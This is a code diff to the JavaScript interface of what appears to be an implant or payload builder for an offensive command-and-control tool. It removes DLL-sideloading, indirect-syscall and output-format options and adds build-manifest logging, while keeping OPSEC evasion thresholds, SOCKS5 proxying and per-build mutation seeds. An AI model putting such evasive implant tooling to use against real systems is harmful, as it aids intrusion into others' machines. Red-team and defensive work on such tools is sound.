@@ -15,18 +15,9 @@ class PayloadManager {
     }
 
     setupEventListeners() {
-        // DLL sideloading toggle
-        document.getElementById('dllSideloading').addEventListener('change', function() {
-            document.getElementById('sideloadingOptions').classList.toggle('hidden', !this.checked);
-        });
         // SOCKS5 proxy toggle
         document.getElementById('socks5_enabled').addEventListener('change', function() {
             document.getElementById('socks5Options').classList.toggle('hidden', !this.checked);
-        });
-
-        // Architecture change handler
-        document.getElementById('architecture').addEventListener('change', (e) => {
-            this.updateAvailableFormats(e.target.value);
         });
 
         // Form submission handler
@@ -172,46 +163,6 @@ class PayloadManager {
         }
     }
 
-    updateAvailableFormats(architecture) {
-        const formatSelect = document.getElementById('format');
-        const isWindows = ['x64', 'x86'].includes(architecture);
-        
-        formatSelect.innerHTML = '';
-        
-        if (isWindows) {
-            const windowsFormats = [
-                { value: 'windows_exe', label: 'Windows EXE' },
-                { value: 'windows_dll', label: 'Windows DLL' },
-                { value: 'windows_shellcode', label: 'Windows Shellcode' },
-                { value: 'windows_service', label: 'Windows Service EXE' }
-            ];
-            
-            windowsFormats.forEach(format => {
-                const option = document.createElement('option');
-                option.value = format.value;
-                option.textContent = format.label;
-                formatSelect.appendChild(option);
-            });
-        } else if (architecture === 'arm64') {
-            [
-                { value: 'linux_elf', label: 'Linux ELF' },
-                { value: 'linux_arm_binary', label: 'Linux ARM Binary' }
-            ].forEach(format => {
-                const option = document.createElement('option');
-                option.value = format.value;
-                option.textContent = format.label;
-                formatSelect.appendChild(option);
-            });
-        } else {
-            const option = document.createElement('option');
-            option.value = 'linux_elf';
-            option.textContent = 'Linux ELF';
-            formatSelect.appendChild(option);
-        }
-        
-        formatSelect.dispatchEvent(new Event('change'));
-    }
-
     async handleFormSubmission(e) {
         const formData = new FormData(e.target);
         const config = Object.fromEntries(formData);
@@ -222,8 +173,6 @@ class PayloadManager {
             return;
         }
         // Convert checkbox values to boolean
-        config.indirectSyscall = config.indirectSyscall === 'on';
-        config.dllSideloading = config.dllSideloading === 'on';
         config.socks5_enabled = config.socks5_enabled === 'on';
         config.socks5_host = String(config.socks5_host || '').trim();
         config.socks5_port = parseInt(config.socks5_port, 10) || 0;
@@ -231,9 +180,7 @@ class PayloadManager {
         // ---  Parse OPSEC fields ---
         config.proc_scan_interval_secs = parseInt(config.proc_scan_interval_secs, 10) || 300;
         config.base_threshold_enter_full_opsec = parseFloat(config.base_threshold_enter_full_opsec) || 60.0;
-        config.base_threshold_exit_full_opsec = parseFloat(config.base_threshold_exit_full_opsec) || 60.0;
         config.base_threshold_enter_reduced_activity = parseFloat(config.base_threshold_enter_reduced_activity) || 20.0;
-        config.base_threshold_exit_reduced_activity = parseFloat(config.base_threshold_exit_reduced_activity) || 20.0;
         config.min_duration_full_opsec_secs = parseInt(config.min_duration_full_opsec_secs, 10) || 300;
         config.min_duration_reduced_activity_secs = parseInt(config.min_duration_reduced_activity_secs, 10) || 120;
         config.min_duration_background_opsec_secs = parseInt(config.min_duration_background_opsec_secs, 10) || 60;
@@ -251,6 +198,9 @@ class PayloadManager {
 
         const downloadSection = document.getElementById('download-section');
         downloadSection.classList.add('hidden');
+        const manifestLink = downloadSection.querySelector('.manifest-link');
+        manifestLink.hidden = true;
+        manifestLink.removeAttribute('href');
 
         this.clearLogDisplay();
         this.isGeneratingPayload = true;
@@ -268,7 +218,8 @@ class PayloadManager {
             });
 
             if (!response.ok) {
-                throw new Error('Failed to generate payload');
+                const responseText = (await response.text()).trim();
+                throw new Error(responseText || `Payload generation failed (${response.status})`);
             }
 
             const result = await response.json();
@@ -277,6 +228,18 @@ class PayloadManager {
             this.addLogEntry('payload', `Successfully generated payload: ${result.filename} (${formatBytes(result.size)})`, 'INFO');
             if (result.mutation_seed) {
                 this.addLogEntry('payload', `Mutation seed: ${result.mutation_seed} (record it with the git revision to reproduce mutation choices; enrollment remains unique per build)`, 'INFO');
+            }
+            if (result.manifest) {
+                if (result.manifest.target_triple) {
+                    this.addLogEntry('payload', `Target triple: ${result.manifest.target_triple}`, 'INFO');
+                }
+                if (result.manifest.git_revision) {
+                    this.addLogEntry('payload', `Git revision: ${result.manifest.git_revision}`, 'INFO');
+                }
+                const artifactSha256 = result.manifest.artifact?.sha256 || result.manifest.artifact_sha256;
+                if (artifactSha256) {
+                    this.addLogEntry('payload', `Artifact SHA-256: ${artifactSha256}`, 'INFO');
+                }
             }
             
             downloadSection.classList.remove('hidden');
@@ -289,6 +252,10 @@ class PayloadManager {
             downloadButton.onclick = () => {
                 window.location.href = `/api/payload/download/${result.id}`;
             };
+            if (result.manifest_url) {
+                manifestLink.href = result.manifest_url;
+                manifestLink.hidden = false;
+            }
         } catch (error) {
             console.error('Error:', error);
             this.addLogEntry('payload', `Failed to generate payload: ${error.message}`, 'ERROR');
